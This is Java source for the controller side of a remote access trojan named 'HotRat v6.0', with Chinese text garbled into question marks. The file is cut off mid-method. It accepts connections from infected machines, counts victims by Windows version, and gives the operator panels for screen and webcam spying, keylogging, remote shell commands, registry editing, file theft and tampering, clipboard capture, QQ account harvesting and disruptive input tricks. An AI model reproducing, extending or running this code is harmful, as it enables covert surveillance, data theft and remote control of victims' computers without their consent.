package me.server;

import com.sun.jna.platform.WindowUtils;
import me.server.LoadConfig.ConfigReader;
import me.server.LoadConfig.ConfigWriter;
import me.server.receive.*;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class Server {
    static ServerSocket socket;
    static Socket mesocket;
    static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
    static String LookAndFeel = System.getProperty("user.dir") + "\\LookAndFeel.cfg";
    public static int WINDOWSXP = 0;
    public static int WINDOWS7 = 0;
    public static int WINDOWS10 = 0;
    public static int OTHER = 0;
    public static int ALL = 0;

    public static void main(String[] args) {
        try {
            System.setProperty("sun.java2d.noddraw", "true");
            File file = new File(LookAndFeel);
            ConfigWriter configWriter1 = new ConfigWriter(LookAndFeel);
            ConfigWriter configWriter = new ConfigWriter(CFGPATH);
            configWriter1.CreateCFG("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
            configWriter.CreateCFG("port","11451");
            if(file.exists()) {
                UIManager.setLookAndFeel(ConfigReader.Read(LookAndFeel,"LookAndFeel"));
            }
            String shit = ConfigReader.Read(CFGPATH,"port");
            JTextArea area = new JTextArea(4, 30);
            area.setBackground(Color.LIGHT_GRAY);
            area.setForeground(Color.black);
            area.setEditable(false);
            Font font = new Font(Font.SERIF,Font.PLAIN,13);
            InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/icon.png");
            Image image = ImageIO.read(inputStream);
            area.setFont(font);
            JScrollPane jScrollPane = new JScrollPane(area);
            area.append("????????????HotRat????????????" + "\n");
            area.append("????????????????????????????????????" + "\n");
            area.append("?????????????????? by Krgjd_" + "\n");
            area.append("??????:511413324" + "\n");
            area.append("????????????:" + shit + "\n");
            JFrame frame = new JFrame("HotRat v6.0 ????????? | ????????????->" + "WindowsXP:" + WINDOWSXP+"  " + "Windows7:"  + WINDOWS7 + "  " + "Windows10/11:" + WINDOWS10 + "  " + "Other:" + OTHER + "  " + "All:" + ALL);
            frame.setIconImage(image);
            WindowUtils.setWindowAlpha(frame,0.8f);
            JMenuBar bar = new JMenuBar();
            JMenu menu = new JMenu("??????");
            JMenu menu1 = new JMenu("??????");
            JMenuItem jMenuItem = new JMenuItem("????????????");
            JMenuItem jMenuItem2 = new JMenuItem("????????????");
            JMenuItem jMenuItem1 = new JMenuItem("??????");
            JMenuItem jMenuItem3 = new JMenuItem("Swing");
            JMenuItem jMenuItem4 = new JMenuItem("Windows");
            JMenuItem jMenuItem5 = new JMenuItem("Motif");
            JMenuItem jMenuItem6 = new JMenuItem("Nimbus");
            frame.add(jScrollPane,BorderLayout.SOUTH);
            menu.add(jMenuItem);
            menu.add(jMenuItem1);
            menu.add(jMenuItem2);
            menu1.add(jMenuItem3);
            menu1.add(jMenuItem4);
            menu1.add(jMenuItem5);
            menu1.add(jMenuItem6);
            bar.add(menu);
            bar.add(menu1);
            frame.setResizable(false);
            JPanel panel = new JPanel();
            panel.setSize(100,100);
            frame.setJMenuBar(bar);
            frame.add(panel,BorderLayout.CENTER);
            panel.setBackground(Color.LIGHT_GRAY);
            frame.setVisible(true);
            frame.setSize(900,500);
            frame.setLocationRelativeTo(null);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            ExecutorService executorService = Executors.newCachedThreadPool();
            jMenuItem.addActionListener(a->{
                JOptionPane.showMessageDialog(null,"??????:6.0 by Krgjd","????????????",JOptionPane.INFORMATION_MESSAGE);
            });
            jMenuItem1.addActionListener(a->{
                System.exit(0);
            });
            jMenuItem2.addActionListener(a ->{
               String str = JOptionPane.showInputDialog(null,"???????????????????????????","??????",JOptionPane.QUESTION_MESSAGE);
               configWriter.Write("port",str);
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem3.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","javax.swing.plaf.metal.MetalLookAndFeel");
                    JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem4.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
                    JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem5.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.motif.MotifLookAndFeel");
                    JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem6.addActionListener(a->{
                configWriter1.Write("LookAndFeel","javax.swing.plaf.nimbus.NimbusLookAndFeel");
                JOptionPane.showMessageDialog(null,"??????????????????,???????????????","??????",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            socket = new ServerSocket(Integer.parseInt(shit));
            while (true) {
                mesocket = socket.accept();
                executorService.execute(new ClientPage(mesocket,panel,frame,area));
            }
        }catch (Exception e) {
        }
    }
}

class ClientPage implements Runnable{
    Socket mesocket;
    JPanel panel;
    JFrame frame;
    JTextArea area;
    GetKey getKey;
    GetScreen getClient;
    ArrayList<Integer> arrayList = new ArrayList<>();
    Get get;
    GetFile getFile;
    GetTaskList newget;
    GetMessage getMessage;
    public ClientPage(Socket socket,JPanel pane,JFrame frame,JTextArea textArea) {
        this.mesocket = socket;
        this.area = textArea;
        this.panel = pane;
        this.frame = frame;
    }
    @Override
    public void run() {
        try {
            DataOutputStream dataOutputStream = new DataOutputStream(mesocket.getOutputStream());
            DataInputStream dataInputStream = new DataInputStream(mesocket.getInputStream());
            dataOutputStream.writeInt(100);
            dataOutputStream.flush();
            String str = dataInputStream.readUTF();
            String str1 = dataInputStream.readUTF();
            String str2 = dataInputStream.readUTF();
            String str3 = dataInputStream.readUTF();
            String str4 = dataInputStream.readUTF();
            Date date = new Date();
            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
            SystemDisplay(str2,str3);
            JButton button = new JButton(str1 + "|" + str2 + "|" + str3 + "|" + str4);
            panel.add(button,BorderLayout.CENTER);
            area.append("ip: [" + str  + "]" +"???????????????????????????! ??????:"  +  format.format(date)  + "\n");
            frame.setSize(901,501);//????????????
            frame.setSize(900,500);
            frame.repaint();
            if(str3.toLowerCase().indexOf("xp")!=-1) {
                Server.WINDOWSXP++;
                Server.ALL++;
                frame.setTitle("HotRat v6.0 ????????? | ????????????->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            } else if (str3.toLowerCase().indexOf("7")!=-1) {
                Server.WINDOWS7++;
                Server.ALL++;
                frame.setTitle("HotRat v6.0 ????????? | ????????????->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            }else if (str3.toLowerCase().indexOf("10")!=-1 || str3.toLowerCase().indexOf("11")!=-1) {
                Server.WINDOWS10++;
                Server.ALL++;
                frame.setTitle("HotRat v6.0 ????????? | ????????????->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            }else {
                Server.OTHER++;
                Server.ALL++;
                frame.setTitle("HotRat v6.0 ????????? | ????????????->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            }
            new SendHeartPack(dataOutputStream,panel,frame,area,str2,button,str3).start();
            button.addActionListener(a->{
                try {
                    cmd(mesocket,str);
                } catch (IOException e) {
                }
            });
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void SystemDisplay(String str,String str2) throws AWTException {
        SystemTray systemTray = SystemTray.getSystemTray();
        Image image = Toolkit.getDefaultToolkit().createImage("icon.png");
        TrayIcon trayIcon = new TrayIcon(image);
        systemTray.add(trayIcon);
        trayIcon.displayMessage("???????????????",str + "\n" + str2, TrayIcon.MessageType.INFO);
    }
        public void Video(OutputStreamWriter writer,InputStreamReader reader,DataOutputStream dataOutputStream) throws IOException {
        JDialog frame = new JDialog();
        InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/screen.png");
        Image image = ImageIO.read(inputStream);
        frame.setIconImage(image);
        JPanel jPanel = new JPanel();
        frame.add(jPanel,BorderLayout.NORTH);
        JLabel label = new JLabel();
        JScrollPane scrollPane = new JScrollPane(label);
        frame.add(scrollPane,BorderLayout.CENTER);
        getClient = new GetScreen(mesocket,label,frame);
        getClient.run = true;
        frame.setSize(800,600);
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
            new Thread(getClient).start();
            getClient.run = true;
            writer.write("-Screen Start");
            writer.flush();
            frame.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(WindowEvent e) {
                    try {
                        writer.write("-Screen Stop");
                        writer.flush();
                        getClient.run = false;
                    } catch (Exception e1) {
                    }
                }
            });
    }

    public void setRegistry(InputStreamReader reader,OutputStreamWriter writer) {
        JDialog dialog = new JDialog();
        JPanel panel = new JPanel();
        JButton button = new JButton("??????");
        JButton button1 = new JButton("??????");
        JButton button2 = new JButton("??????/??????");
        button.setBackground(Color.RED);
        panel.add(button);
        Font font = new Font(Font.SERIF,Font.PLAIN,20);
        JTextArea textArea = new JTextArea();
        textArea.setEditable(false);
        textArea.setFont(font);
        textArea.append("HKEY_CLASSES_ROOT" + "\n");
        textArea.append("HKEY_CURRENT_USER"+ "\n");
        textArea.append("HKEY_LOCAL_MACHINE"+ "\n");
        textArea.append("HKEY_USERS"+ "\n");
        textArea.append("HKEY_CURRENT_CONFIG"+ "\n");
        JScrollPane scrollPane = new JScrollPane(textArea);
        JTextField textField = new JTextField(30);
        panel.add(textField);
        panel.add(button1);
        panel.add(button2);
        dialog.add(scrollPane,BorderLayout.CENTER);
        dialog.add(panel,BorderLayout.NORTH);
        dialog.setTitle("???????????????");
        dialog.setVisible(true);
        dialog.setSize(700,500);
        dialog.setLocationRelativeTo(null);
        dialog.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                get.run = false;
            }
        });
        button.addActionListener(a->{
                textArea.setText("");
                get = new Get(reader,textArea);
                new Thread(get).start();
                get.run = true;
                String str = "-regF " + textField.getText();
            try {
                writer.write(str);
                writer.flush();
            }catch (Exception e) {
            }
        });
        button2.addActionListener(a->{
            String[] strings = {"String","ExpandableString","Long"};
            String str3 =(String) JOptionPane.showInputDialog(null,"?????????","??????",JOptionPane.QUESTION_MESSAGE,null,strings,strings[0]);
            JDialog dialog1 = new JDialog();
            JLabel label = new JLabel("??????");
            JLabel label1 = new JLabel("???");
            JButton button3 = new JButton("??????");
            JTextField textField1 = new JTextField(15);
            JTextField textField2 = new JTextField(15);
            JPanel panel1 = new JPanel();
            JPanel panel2 = new JPanel();
            JPanel panel3 = new JPanel();
            panel3.add(button3);
            panel2.add(label1);
            panel2.add(textField2);
            panel1.add(label);
            panel1.add(textField1);
            dialog1.add(panel1,BorderLayout.NORTH);
            dialog1.add(panel2,BorderLayout.CENTER);
            dialog1.add(panel3,BorderLayout.SOUTH);
            dialog1.setLocationRelativeTo(null);
            dialog1.setTitle("??????");
            dialog1.setSize(400,150);
            dialog1.setVisible(true);
            button3.addActionListener(a1->{
                try {
                    String str1 = textField1.getText();
                    String str2 = textField2.getText();
                    try {
                        switch (str3) {
                            case "String":
                                writer.write("-regC1 " + textField.getText() + ":path" + str1 + ":key" + str2 + ":value");
                                writer.flush();
                                break;
                            case "ExpandableString":
                                writer.write("-regC2 " + textField.getText() + ":path" + str1 + ":key" + str2 + ":value");
                                writer.flush();
                                break;
                            case "Long":
                                writer.write("-regC3 " + textField.getText() + ":path" + str1 + ":key" + str2 + ":value");
                                writer.flush();
                                break;
                        }
                        dialog1.dispose();
                    }catch (Exception e) {
                    }
                }catch (Exception e) {
                }
            });
        });
        button1.addActionListener(a->{
            JDialog dialog1 = new JDialog();
            JLabel label1 = new JLabel("????????????");
            JButton button3 = new JButton("??????");
            JTextField textField2 = new JTextField(15);
            JPanel panel2 = new JPanel();
            JPanel panel3 = new JPanel();
            panel3.add(button3);
            panel2.add(label1);
            panel2.add(textField2);
            dialog1.setLocationRelativeTo(null);
            dialog1.add(panel2,BorderLayout.CENTER);
            dialog1.add(panel3,BorderLayout.SOUTH);
            dialog1.setTitle("??????");
            dialog1.setSize(400,150);
            dialog1.setVisible(true);
            button3.addActionListener(a1->{
                try {
                    String str = textField2.getText();
                    writer.write("-regD " + textField.getText() + ":path" + str + ":key");
                    writer.flush();
                    dialog1.dispose();
                }catch (Exception e) {
                }
            });
        });
    }

    public void sendCommand(InputStreamReader reader,OutputStreamWriter writer) {
        JDialog frame1 = new JDialog();
        JTextArea jta=new JTextArea();
        jta.setEditable(false);
        jta.setBackground(Color.BLACK);
        jta.setForeground(Color.green);
        JScrollPane jsp=new JScrollPane(jta);
        JPanel jp=new JPanel();
        JTextField jtf=new JTextField(15);
        JButton jb=new JButton("??????");
        jb.setBackground(new Color(0, 250, 0));
        jp.add(jtf);
        jp.add(jb);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        jta.setFont(font);
        jtf.setFont(font);
        frame1.add(jsp,BorderLayout.CENTER);
        frame1.add(jp,BorderLayout.SOUTH);
        frame1.setTitle("cmd");
        frame1.setSize(500,300);
        frame1.setLocationRelativeTo(null);
        frame1.setVisible(true);
        jb.addActionListener(a->{
            try {
                get = new Get(reader,jta);
                new Thread(get).start();
                get.run = true;
                writer.write("-cmd " + jtf.getText());
                writer.flush();
                jta.append(jtf.getText() + "\n");
                jtf.setText("");
            }catch (Exception e) {
            }
        });
        frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                try {
                    get.run = false;
                } catch (Exception e1) {
                }
            }
        });
    }

    public void findWindows(InputStreamReader reader,OutputStreamWriter writer) {
        JDialog dialog = new JDialog();
        dialog.setTitle("????????????");
        JTextField textField = new JTextField(20);
        JButton button1 = new JButton("??????");
        JButton button = new JButton("??????");
        JLabel label = new JLabel("??????????????????");
        JPanel top = new JPanel();
        JPanel bottom = new JPanel();
        top.add(label);
        bottom.add(button1);
        bottom.add(button);
        top.add(textField);
        dialog.add(top, BorderLayout.NORTH);
        dialog.add(bottom,BorderLayout.SOUTH);
        dialog.setVisible(true);
        dialog.setSize(400,150);
        dialog.setLocationRelativeTo(null);
        button1.addActionListener(a->{
            try {
                writer.write("-hidewindow" + " " + textField.getText());
                writer.flush();
            } catch (IOException e) {
            }
        });
        button.addActionListener(a->{
            try {
                writer.write("-showwindow" + " " + textField.getText());
                writer.flush();
            } catch (IOException e) {
            }
        });
    }

    public void controlKeyboardAndMouse(OutputStreamWriter writer) {
        JDialog dialog = new JDialog();
        dialog.setTitle("??????");
        JTextField textField = new JTextField(20);
        JButton button = new JButton("??????");
        JButton button1 = new JButton("??????");
        JLabel label = new JLabel("??????");
        JLabel label1 = new JLabel("????????????");
        JButton button2 = new JButton("??????");
        JButton button3 = new JButton("??????");
        JPanel top = new JPanel();
        JPanel bottom = new JPanel();
        top.add(label);
        top.add(button3);
        top.add(button2);
        bottom.add(label1);
        bottom.add(button1);
        bottom.add(button);
        top.add(textField);
        dialog.add(top, BorderLayout.NORTH);
        dialog.add(bottom,BorderLayout.SOUTH);
        dialog.setVisible(true);
        dialog.setSize(450,150);
        dialog.setLocationRelativeTo(null);
        button2.addActionListener(a->{
            try {
                writer.write("-RandompressStart " + textField.getText());
                writer.flush();
            } catch (IOException e) {
            }
        });
        button3.addActionListener(a->{
            String str = "-RandompressStop";
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
        });
        button.addActionListener(a->{
            String str = "-LockmouseLocking";
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
        });
        button1.addActionListener(a->{
            String str = "-LockmouseUnlock";
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
        });
    }

    public void clipBoard(InputStreamReader reader,OutputStreamWriter writer){
        JDialog dialog = new JDialog();
        dialog.setTitle("?????????");
        JTextField textField = new JTextField(20);
        JTextField textField1 = new JTextField(20);
        textField.setEditable(false);
        JButton button1 = new JButton("??????");
        JButton button = new JButton("??????");
        JPanel top = new JPanel();
        JPanel bottom = new JPanel();
        bottom.add(button1);
        bottom.add(textField1);
        top.add(button);
        top.add(textField);
        dialog.add(top, BorderLayout.NORTH);
        dialog.add(bottom,BorderLayout.SOUTH);
        dialog.setVisible(true);
        dialog.setSize(400,150);
        dialog.setLocationRelativeTo(null);
        button.addActionListener(a->{
            textField.setText("");
            String str = "-GetClipboard";
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
           new Thread(new TextGet(reader,textField)).start();
        });
        button1.addActionListener(a->{
            String str = "-SetClipboard" + " " + textField1.getText();
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
        });
    }

    public void remoteChat(InputStreamReader reader,OutputStreamWriter writer) {
        JDialog jWindow = new JDialog();
        jWindow.setTitle("????????????");
        JTextArea jta=new JTextArea();
        jta.setEditable(false);
        jta.setBackground(Color.BLACK);
        jta.setForeground(Color.green);
        JScrollPane jsp=new JScrollPane(jta);
        JPanel jp=new JPanel();
        JTextField jtf=new JTextField(15);
        JButton jb=new JButton("??????");
        jb.setBackground(new Color(0, 250, 0));
        jp.add(jtf);
        jp.add(jb);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        jta.setFont(font);
        jtf.setFont(font);
        jWindow.add(jsp,BorderLayout.CENTER);
        jWindow.add(jp,BorderLayout.SOUTH);
        jWindow.setSize(500,300);
        jWindow.setLocationRelativeTo(null);
        jWindow.setVisible(true);
        getMessage = new GetMessage(reader,jta,writer);
        getMessage.start();
        getMessage.run = true;
        jb.addActionListener(a->{
            try {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy:MM:dd  hh:mm:ss");
                Date date = new Date();
                dateFormat.format(date);
                writer.write("-MEG " + date + "\n"+"Server: " + jtf.getText() + "\n");
                writer.flush();
                jta.append(date + "\n");
                jta.append("???: " + jtf.getText() + "\n");
                jtf.setText("");
            }catch (Exception e) {
            }
        });
        jWindow.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                try {
                    getMessage.run = false;
                    writer.write("-MEG end");
                    writer.flush();
                } catch (IOException ex) {
                }
            }
        });
    }

    public void taskList(InputStreamReader reader) throws IOException{
        JDialog frame1 = new JDialog();
        JTable table = new JTable();
        DefaultTableModel defaultTableModel = new DefaultTableModel(null,new String[]{"?????????","CPU","Memory","VSZ","RSS","PID"});
        table.setModel(defaultTableModel);
        frame1.setTitle("????????????");
        newget = new GetTaskList(reader,defaultTableModel);
        new Thread(newget).start();
        newget.run = true;
        JScrollPane scrollPane = new JScrollPane(table);
        frame1.add(scrollPane);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(500,300);
        frame1.setVisible(true);
        frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                newget.run = false;
            }
        });
    }

    public void qqNumber(InputStreamReader reader) throws IOException, ClassNotFoundException {
        JDialog frame1 = new JDialog();
        JTable table = new JTable();
        DefaultTableModel defaultTableModel = new DefaultTableModel(null,new String[]{"","QQ"});
        table.setModel(defaultTableModel);
        frame1.setTitle("QQ???");
        newget = new GetTaskList(reader,defaultTableModel);
        new Thread(newget).start();
        newget.run = true;
        JScrollPane scrollPane = new JScrollPane(table);
        frame1.add(scrollPane);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(500,300);
        frame1.setVisible(true);
        frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                newget.run = false;
            }
        });
    }

    public File chooseFile() {
        JFileChooser chooser = new JFileChooser();
        chooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
        chooser.showDialog(null,null);
        return chooser.getSelectedFile();
    }

    public void getFile(InputStreamReader reader,OutputStreamWriter writer,DataOutputStream dataOutputStream) throws IOException {
        JDialog dialog = new JDialog();
        JPanel panel = new JPanel();
        JButton button = new JButton("??????");
        JButton button1 = new JButton("??????");
        JButton button2 = new JButton("??????");
        JButton button3 = new JButton("??????");
        button.setBackground(Color.RED);
        panel.add(button);
        JTable table = new JTable();
        DefaultTableModel defaultTableModel = new DefaultTableModel(null,new String[]{"??????","?????????","????????????","????????????"});
        table.setModel(defaultTableModel);
        JScrollPane scrollPane = new JScrollPane(table);
        JTextField textField = new JTextField(30);
        writer.write("-FileG " + textField.getText());
        writer.flush();
        getFile = new GetFile(reader,defaultTableModel);
        new Thread(getFile).start();
        getFile.run = true;
        panel.add(textField);
        panel.add(button1);
        panel.add(button2);
        panel.add(button3);
        dialog.add(scrollPane,BorderLayout.CENTER);
        dialog.add(panel,BorderLayout.NORTH);
        dialog.setTitle("????????????");
        dialog.setVisible(true);
        dialog.setSize(700,500);
        dialog.setLocationRelativeTo(null);
        button.addActionListener(a->{
            for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
                defaultTableModel.removeRow(index);
            }
            getFile = new GetFile(reader,defaultTableModel);
            new Thread(getFile).start();
            getFile.run = true;
            String str ="-File" +" " + textField.getText();
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
        });
        button1.addActionListener(a->{
            String str = "-FileD" +" " + textField.getText() + "\\" + JOptionPane.showInputDialog(null,"??????????????????","??????",JOptionPane.QUESTION_MESSAGE);
            try {
                writer.write(str);
                writer.flush();
            } catch (IOException e) {
            }
        });
        button2.addActionListener(a->{
            String name = JOptionPane.showInputDialog(null,"????????????(?????????+??????)","??????",JOptionPane.QUESTION_MESSAGE);
            String path = textField.getText() + "\\" + name;
            String str = "-FileC" +" " + textField.getText() + "\\" + name;
            try {
                writer.write(str);
                writer.flush();
                JDialog jWindow = new JDialog();
                jWindow.setTitle("????????????");
                JTextArea jta=new JTextArea();
                JButton jButton = new JButton("??????");
                jta.setBackground(Color.BLACK);
                jta.setForeground(Color.green);
                JScrollPane jsp=new JScrollPane(jta);
                JPanel jp=new JPanel();
                jp.add(jButton);
                Font font1 = new Font(Font.SERIF,Font.PLAIN,13);
                jta.setFont(font1);
                jWindow.add(jsp,BorderLayout.CENTER);
                jWindow.add(jp,BorderLayout.SOUTH);
                jWindow.setSize(500,300);
                jWindow.setLocationRelativeTo(null);
                jWindow.setVisible(true);
                jWindow.addWindowListener(new WindowAdapter() {
                    @Override
                    public void windowClosing(WindowEvent e) {
                        newget.run = false;
                    }
                });
                jButton.addActionListener(a1->{
                    try {
                        writer.write("-FileW " + path + ":path" + jta.getText() + ":content");
                        writer.flush();
                        jWindow.dispose();
                    } catch (IOException e) {
                    }
                });
            } catch (IOException e) {
            }
        });
        button3.addActionListener(a->{
            String[] modes = {"??????","??????","??????","??????"};
            String mode = (String) JOptionPane.showInputDialog(null,"??????","??????",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
            switch (mode) {
                case "??????":
                    try {
                        String str = "-FileO" +" " + textField.getText() + "\\" + JOptionPane.showInputDialog(null,"????????????(?????????+??????)","??????",JOptionPane.QUESTION_MESSAGE);
                        writer.write(str);
                        writer.flush();
                    } catch (IOException e) {
                    }
                    break;
                case "??????":
                    try {
                        String str = "-FileCopy" + " " + textField.getText() + "\\" + JOptionPane.showInputDialog(null,"????????????(?????????+??????)","??????",JOptionPane.QUESTION_MESSAGE) + ":path" + JOptionPane.showInputDialog(null,"????????????","??????",JOptionPane.QUESTION_MESSAGE);
                        writer.write(str);
                        writer.flush();
                    }catch (Exception e) {
                    }
                    break;
                case "??????":
                    try {
                        String str = "-fileGet" + " " + textField.getText() + "\\" + JOptionPane.showInputDialog(null,"????????????(?????????+??????)","??????",JOptionPane.QUESTION_MESSAGE);
                        String str2 = JOptionPane.showInputDialog(null,"??????????????????(?????????+??????)","??????",JOptionPane.QUESTION_MESSAGE);
                        writer.write(str);
                        writer.flush();
                        GetFiles getFiles = new GetFiles(mesocket,str2);
                        new Thread(getFiles).start();
                    }catch (Exception e) {
                    }
                    break;
                case "??????":
                        String str1 = "-FileL " +  textField.getText() + "\\" + JOptionPane.showInputDialog(null,"????????????(?????????+??????)","??????",JOptionPane.QUESTION_MESSAGE);
                        JDialog jWindow = new JDialog();
                        JButton jButton = new JButton("??????");
                        jWindow.setTitle("????????????");
                        JTextArea jta=new JTextArea();
                        jta.setEditable(false);
                        jta.setBackground(Color.BLACK);
                        jta.setForeground(Color.green);
                        JScrollPane jsp=new JScrollPane(jta);
                        JPanel jp=new JPanel();
                        Font font1 = new Font(Font.SERIF,Font.PLAIN,13);
                        jta.setFont(font1);
                        jp.add(jButton);
                        jWindow.add(jsp,BorderLayout.CENTER);
                        jWindow.add(jp,BorderLayout.SOUTH);
                        jWindow.setSize(500,300);
                        jWindow.setLocationRelativeTo(null);
                        jWindow.setVisible(true);
                    jWindow.addWindowListener(new WindowAdapter() {
                        @Override
                        public void windowClosing(WindowEvent e) {
                            get.run = false;
                        }
                    });
                        jButton.addActionListener(a1->{
                            try {
                                jta.setText("");
                                writer.write(str1);
                                writer.flush();
                                get = new Get(reader,jta);
                                new Thread(get).start();
                                get.run = true;
                            } catch (IOException e) {
                            }
                        });
                    break;
            }
        });
    }

    public void getKeybroad(DataInputStream dataInputStream,OutputStreamWriter writer) throws IOException {
        JDialog frame1 = new JDialog();
        InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/kb.png");
        Image image = ImageIO.read(inputStream);
        frame1.setIconImage(image);
        frame1.setResizable(false);
        JPanel panel1 = new JPanel();
        JButton button = new JButton("??????");
        JButton button1 = new JButton("??????");
        panel1.add(button);
        panel1.add(button1);
        frame1.setTitle("????????????");
        JTextArea area1 = new JTextArea();
        area1.setEditable(false);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        area1.setFont(font);
        JScrollPane scrollPane = new JScrollPane(area1);
        getKey = new GetKey(dataInputStream,area1);
        getKey.run = true;
        new Thread(getKey).start();
        frame1.add(scrollPane,BorderLayout.CENTER);
        frame1.add(panel1,BorderLayout.SOUTH);
        area1.setBackground(Color.BLACK);
        area1.setForeground(Color.green);
        area.setEditable(false);
        frame1.setLocationRelativeTo(null);
        frame1.setSize(500,300);
        frame1.setVisible(true);
        button.addActionListener(a->{
            area1.append("\n");
            area1.append(new Date().toString() + "\n");
        });
       frame1.addWindowListener(new WindowAdapter() {
            @Override
            public void windowClosing(WindowEvent e) {
                getKey.run = false;
                try {
                    writer.write("-Keyboard Stop");
                    writer.flush();
                } catch (IOException ex) {
                }
            }
        });
    }

    public void camera(OutputStreamWriter writer) {
        try {
            DataInputStream dataInputStream = new DataInputStream(mesocket.getInputStream());
            JDialog dialog = new JDialog();
            InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/cam.png");
            Image image = ImageIO.read(inputStream);
            dialog.setIconImage(image);
            JPanel jPanel = new JPanel();
            JPanel panel1 = new JPanel() {
                @Override
                public void paint(Graphics graphics) {
                    try {
                        BufferedImage image = GetCamera.trans(dataInputStream,arrayList);
                        graphics.drawImage(image, 50, 50, null);
                        dialog.repaint();
                    } catch (Exception e) {
                    }
                }
            };
            dialog.add(panel1);
            dialog.add(jPanel, BorderLayout.NORTH);
            dialog.setTitle("?????????");
            dialog.setLocationRelativeTo(null);
            dialog.setSize(300, 300);
            dialog.setVisible(true);
            dialog.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(WindowEvent e) {
                    try {
                        writer.write("-Camera Stop");
                        writer.flush();
                    } catch (IOException ex) {
                    }
                }
            });
        }catch(Exception e){
        }
    }

    public void cmd(Socket socket,String str1) throws IOException {
        System.setProperty("sun.java2d.noddraw", "true");
        JDialog frame1 = new JDialog();
        InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/cmd.png");
        Image image = ImageIO.read(inputStream);
        frame1.setIconImage(image);
        JTextArea jta=new JTextArea();
        WindowUtils.setWindowAlpha(frame1,0.8f);
        jta.setEditable(false);
        jta.append("HotRat?????????" + "\n");
        jta.append("-emptybackground ??????????????????" + "\n");
        jta.append("-Camera ???????????????" + "\n");
        jta.append("-keyboardMouse ????????????/????????????" + "\n");
        jta.append("-command cmd??????" + "\n");
        jta.append("-notification + ??????"+ "\n");
        jta.append("-browse + ??????" + "\n");
        jta.append("-FlashBomb + ??????  ??????" + "\n");
        jta.append("-Tasklist ??????????????????" + "\n");
        jta.append("-RemoteChat ????????????" + "\n");
        jta.append("-TaskKill + PID  ??????????????????" + "\n");
        jta.append("-Clipboard ??????,???????????????" + "\n");
        jta.append("-Keyboard ????????????" + "\n");
        jta.append("-registry ???????????????" + "\n");
        jta.append("-FindWindows ????????????" + "\n");
        jta.append("-SystemInfo ??????????????????" + "\n");
        jta.append("-File ?????????????????????" + "\n");
        jta.append("-QQNumber ???????????????QQ???" + "\n");
        jta.append("-Screen ????????????" + "\n");
